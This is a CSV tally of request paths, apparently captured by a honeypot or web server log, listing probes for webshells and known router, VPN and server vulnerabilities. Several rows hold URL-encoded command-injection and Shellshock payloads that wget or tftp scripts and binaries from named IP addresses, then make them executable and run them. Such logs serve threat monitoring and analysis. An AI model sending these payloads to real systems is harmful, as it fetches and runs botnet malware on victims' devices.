Signature,Spots,Hits
/admin/modules/backup/page.backup.php,1,3
/recordings/shell-test.php,1,3
/_asterisk/V-E-M.php,1,3
/dispatch.php,1,3
/recordings/azoofo.php,1,3
/admin/modules/admindashboard/phpsysinfo/common_admin_functions.php,1,3
/vtigercrm/11.php,1,3
/sip.txt,1,3
/panel/fortest.php,1,3
/recordings/config.amportal.php,1,3
/admin/modules/admindashboard/phpsysinfo/ass.php,1,3
/xml.php,1,3
/atmin/config.php,1,3
/recordings/SecureShell.php,1,3
/recordings/ELLYAAS/config.php,1,3
/recordings/mo/config.php,1,3
/recordings/pos.php,1,3
/v1/agent/service/register,1,2
//vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php,1,2
/edit/server/,1,2
/tmui/login.jsp/..;/tmui/locallib/workplace/tmshCmd.jsp,1,2
/ajax/networking/get_netcfg.php,1,2
/recordings/main.php.2,1,2
/bin/bash%20-c%20%22rm%20-rf%20/tmp/*;echo%20wget%20http://205.185.122.121/China%22,1,2
/pingcmd.cmd,1,1
/op_type=ping&destination=cd%20/tmp;%20wget%20http://37.46.150.102/lolol.sh;%20chmod%20777%20lolol.sh;%20sh%20lolol.sh,1,1
HTTP/1.1,1,1
/vpns/portal/scripts/newbm.pl,1,1
/op_type=ping&destination=cd%20/tmp;%20wget%20http://185.239.242.63/lolol.sh;%20chmod%20777%20lolol.sh;%20sh%20lolol.sh,1,1
/index.php,1,1
/shell%3Fcd%20%2Ftmp%3B%20echo%20%3ENiGGea%20%7C%7C%20cd%20%2Fvar%3B%20echo%20%3ENiGGea%3B%20cp%20%2Fbin%2Fbusybox%20yee%3B%20%3Eyee%3B%20chmod%20777%20yee%3B%20nohup%20wget%20http%3A%2F%5C%2F87.121.98.34%3A80%2Fillz%2Fmegumi.arm7%20-O%20yee%20%7C%7C%20nohup%20tftp%20-r%20megumi.arm7%20-g%2087.121.98.34%3A80%20-l%20yee%3B%20chmod%20777%20yee%3B.%2Fyee%3B%20rm%20-rf%20yeeter%20%3E%2Fdev%2Fnull%202%3E%261,1,1
/shell%3Fcd%20%2Ftmp%3B%20echo%20%3ENiGGea%20%7C%7C%20cd%20%2Fvar%3B%20echo%20%3ENiGGea%3B%20cp%20%2Fbin%2Fbusybox%20yee%3B%20%3Eyee%3B%20chmod%20777%20yee%3B%20nohup%20wget%20http%3A%2F%5C%2F87.121.98.34%3A80%2Fillz%2Fmegumi.arm4%20-O%20yee%20%7C%7C%20nohup%20tftp%20-r%20megumi.arm4%20-g%2087.121.98.34%3A80%20-l%20yee%3B%20chmod%20777%20yee%3B.%2Fyee%3B%20rm%20-rf%20yeeter%20%3E%2Fdev%2Fnull%202%3E%261,1,1
/v1.38/containers/create,1,1
/_config/query_servers/afhh,1,1
/incl/image_test.shtml,1,1
/cgibin/mainfunction.cgi&action=login&keyPath=wget+http%3A%2F%2F108.174.62.168%2Fsnype.sh+%3B+chmod+777+snype.sh+%3B+sh+snype.sh&loginUser=a&loginPwd=a,1,1
/system,1,1
/setup.cgi%3Fnext_file%3Dnetgear.cfg%26todo%3Dsyscmd%26cmd%3Drm+-rf+%2Ftmp%2F*%3Bwget+http%3A%2F%2F107.172.249.3%2Fbins%2Fsora.mips+-O+%2Ftmp%2Fnetgear%3Bsh+netgear%26curpath%3D%2F%26currentsetting.htm%3D1,1,1
/service/v1/createUser,1,1
/v1.35/containers/create,1,1
/goform/formWsc,1,1
/_config/query_servers/hvkfnjff,1,1
/_config/query_servers/hqatiuy,1,1
/cgibin/mainfunction.cgi&action=login&keyPath=cd%20/tmp;%20wget%20http://103.133.111.238/draytek%20-O%20.draytek;%20chmod%20+x%20.draytek;%20sh%20.draytek;%20rm%20-rf%20.draytek&loginUser=a&loginPwd=a,1,1
/gbrgbr.php,1,1
/cgibin/mainfunction.cgi&action=login&keyPath=cd%20/tmp;%20wget%20http://103.133.111.238/anon%20-O%20.anon;%20chmod%20+x%20.anon;%20sh%20.anon;%20rm%20-rf%20.anon&loginUser=a&loginPwd=a,1,1
/.wgetrc,1,1
/console/framework/skins/wlsconsole/images/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fconsole.portal,1,1
/images/..%2Fapply_abstract.cgi,1,1
/cd%20/tmp%20%7C%7C%20cd%20/run%20%7C%7C%20cd%20/;%20wget%20http://107.173.181.13/Intg420bins.sh;%20chmod%20777%20Intg420bins.sh;%20sh%20Intg420bins.sh;%20tftp%20107.173.181.13%20-c%20get%20Intg420tftp1.sh;%20chmod%20777%20Intg420tftp1.sh;%20sh%20Intg420tftp1.sh;%20tftp%20-r%20Intg420tftp2.sh%20-g%20107.173.181.13;%20chmod%20777%20Intg420tftp2.sh;%20sh%20Intg420tftp2.sh;%20rm%20-rf%20Intg420bins.sh%20Intg420tftp1.sh%20Intg420tftp2.sh;%20rm%20-rf%20*,1,1
/GET%20/%20HTTP/1.1%20Host:%203.7.80.171%20Referer:%20()%20%7B%20:;%20%7D;%20/bin/bash%20-c%20%22rm%20-rf%20/tmp/*;echo%20wget%20http://205.185.122.121/China.Z%20-O%20/tmp/China.Z-rcja%20%3E%3E%20/tmp/Run.sh;echo%20echo%20By%20China.Z%20%3E%3E%20/tmp/Run.sh;echo%20chmod%20777%20/tmp/China.Z-rcja%20%3E%3E%20/tmp/Run.sh;echo%20/tmp/China.Z-rcja%20%3E%3E%20/tmp/Run.sh;echo%20rm%20-rf%20/tmp/Run.sh%20%3E%3E%20/tmp/Run.sh;chmod%20777%20/tmp/Run.sh;/tmp/Run.sh%22%20Accept:*/*%20User-Agent:%20()%20%7B%20:;%20%7D;%20/bin/bash%20-c%20%22rm%20-rf%20/tmp/*;echo%20wget%20http://205.185.122.121/China.Z%20-O%20/tmp/China.Z-rcja%20%3E%3E%20/tmp/Run.sh;echo%20echo%20By%20China.Z%20%3E%3E%20/tmp/Run.sh;echo%20chmod%20777%20/tmp/China.Z-rcja%20%3E%3E%20/tmp/Run.sh;echo%20/tmp/China.Z-rcja%20%3E%3E%20/tmp/Run.sh;echo%20rm%20-rf%20/tmp/Run.sh%20%3E%3E%20/tmp/Run.sh;chmod%20777%20/tmp/Run.sh;/tmp/Run.sh%22%20Connection:Keep-Alive,1,1
/QNAP_helpdesk.cgi,1,1
